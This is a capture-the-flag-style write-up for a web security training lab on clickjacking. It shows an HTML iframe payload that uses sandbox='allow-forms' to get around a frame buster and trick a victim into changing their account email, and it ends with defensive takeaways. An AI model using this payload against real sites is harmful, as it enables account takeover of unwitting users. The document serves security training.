# Clickjacking - with a frame buster script

## 📌 Lab Details
- **Title**: Clickjacking with a frame buster script
- **Difficulty**: Apprentice
- **Category**: Clickjacking
- **Lab URL**: https://portswigger.net/academy/labs/launch/71c2bcc46f11be8e063fa976c68b2383fb1dfd04c1be432086d3f030159f15ae?referrer=%2fweb-security%2fclickjacking%2flab-frame-buster-script

## 🔍 Summary
This lab shows how to **bypass a frame buster using the** `sandbox="allow-forms"` **attribute on an iframe** to conduct a clickjacking attack, tricking the victim into clicking “Click me” while actually changing their account’s email address.

## 🛠 Steps to Solve
1. Log in to the given account.
2. Inject the payload on the **Exploit** server:
   ```sh
   <style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
    </style>
    <div>Test me</div>
    <iframe sandbox="allow-forms"
    src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
    ```
3. Adjust the values of the template to align the `Click me` button with the `update email` button.
4. Deliver exploit to the victim to complete the lab.

## 📖 Key Takeaways
- **Frame busters can often be bypassed with iframe sandboxing** (`sandbox="allow-forms"`) since it blocks JavaScript (disabling the frame buster) but allows form submissions.
- Proper alignment, transparency, and testing in Chrome remain essential for success.
- Highlights why strong anti-clickjacking defenses like `X-Frame-Options` or CSP `frame-ancestors` are critical.

## 🖼️ Screenshot 
![image](https://github.com/user-attachments/assets/132d4017-48c9-4ffc-b805-a814f64692a7)
![image](https://github.com/user-attachments/assets/17228510-991b-4f85-8ced-5eb6b4ef01c6)
![image](https://github.com/user-attachments/assets/350f202f-2a2a-4ab6-878a-09ef40fcb8fc)
